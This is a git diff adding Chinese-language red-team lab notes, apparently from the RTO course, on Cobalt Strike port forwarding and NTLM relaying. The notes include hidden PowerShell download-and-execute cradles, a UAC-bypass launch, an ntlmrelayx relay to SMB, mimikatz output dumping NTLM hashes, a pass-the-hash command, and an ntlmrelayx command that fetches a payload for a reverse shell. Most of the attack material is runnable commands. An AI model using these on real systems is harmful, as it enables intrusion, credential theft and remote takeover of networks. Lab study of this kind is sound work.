@@ -124,5 +124,173 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 
 ## rportfwd 
 
-1. 
+1.  在dc2上现在是无法直接访问10.10.5.120的80端口的
+
 ![img](1659772122017.png)
+
+
+2. 在WKSTN-1，把本地8080端口流量转到teamserver的80端口
+
+![img](1659833457084.png)
+
+
+netstat查看本地监听已建立
+
+![img](1659833502959.png)
+
+
+3. 现在在dc2上访问WKSTN-1的8080端口，就相当于访问teamserver的80端口
+
+
+![img](1659833623409.png)
+
+
+![img](1659833659363.png)
+
+
+## rportfwd_local
+
+Beacon 也有一个rportfwd_local命令。rportfwd将流量传输到 Team Server，rportfwd_local将流量转到 Cobalt Strike 客户端的机器
+
+1. 在kali上运行一个CS客户端操作
+
+![img](1659833998724.png)
+
+
+kali起一个py服务器，监听8080端口
+
+![img](1659834129257.png)
+
+2. 转发wkstn-1的8080端口到本地（kali的CS客户端）的8080端口上
+
+![img](1659834205925.png)
+
+3. 访问
+
+在wkstn-1上访问本地的8080端口，实际上访问到的是kali的CS客户端上的8080端口内容
+
+![img](1659834373533.png)
+
+在wkstn-2上访问wkstn-1的8080端口，访问到的也是kali的CS客户端上的8080端口内容
+
+![img](1659834547953.png)
+
+4. kali查看
+
+![img](1659834594995.png)
+
+
+## NTLM Relaying
+
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
+
+ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
+
+整个攻击的操作流程图见这里：
+
+![img](https://rto-assets.s3.eu-west-2.amazonaws.com/relaying/overview.png?width=1920)
+
+
+### wkstn-2做中继
+
+1. 上传WinDivert64.sys到靶机，需要system权限，不同于教材，这里选择wkstn-2做中继
+
+
+![img](1659835501447.png)
+
+2. load PortBender，在CS加载[PortBender](https://github.com/praetorian-inc/PortBender)模块
+
+
+![img](1659835334105.png)
+
+3. 查看PortBender，把本地流量445转发到高端口8445
+
+
+![img](1659835587282.png)
+
+4. 把wkstn-2上的8445端口流量转发到teamserver的445端口。因为这是在kali上开启的客户端，所以teamserver的ip填127.0.0.1
+
+
+![img](1659835677989.png)
+
+5. 开启sokes
+```
+beacon> socks 1080
+[+] started SOCKS4a server on: 1080
+```
+
+6. 开启ntlmrelayx，这里指定只监听10.10.17.68（srv-2）的smb流量，所以收到的也是srv-2的哈希
+```
+proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server
+```
+
+7. 用dir命令在wkstn-2上列出wkstn-2里一个不存在的目录，触发NTLM Relay攻击
+
+![img](1659836422147.png)
+
+8. ntlmrelayx收到10.10.17.68过来的smb流量，并且得到了hash
+
+![img](1659836366440.png)
+
+9. 利用得到的srv-2哈希pth访问srv-2
+
+![img](1659837671373.png)
+
+
+### wkstn-1做中继
+
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"
+
+
+powershell.exe  -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"
+
+```
+C:\Users\bfarmer>mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 12 2021 23:10:18
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::lsa /patch
+Domain : WKSTN-1 / S-1-5-21-689523297-2952850621-452819511
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : f16d61a4e64b333d6956a11f99680edb
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+LM   :
+NTLM :
+
+RID  : 000001f5 (501)
+User : Guest
+LM   :
+NTLM :
+
+RID  : 000003f0 (1008)
+User : lapsadmin
+LM   :
+NTLM : e6ee93155fb69bca283883ff75b363f9
+
+mimikatz #
+```
+
+
+sekurlsa::pth /user:Administrator /domain:dev.cyberbotic.io /ntlm:f16d61a4e64b333d6956a11f99680edb /run:powershell.exe
+
+
+## ntlmrelayx.py当收到连接时利用-c参数执行一条命令
+
+返回一个rev shell
+```
+proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.132:8080/b\")"'
+```
+
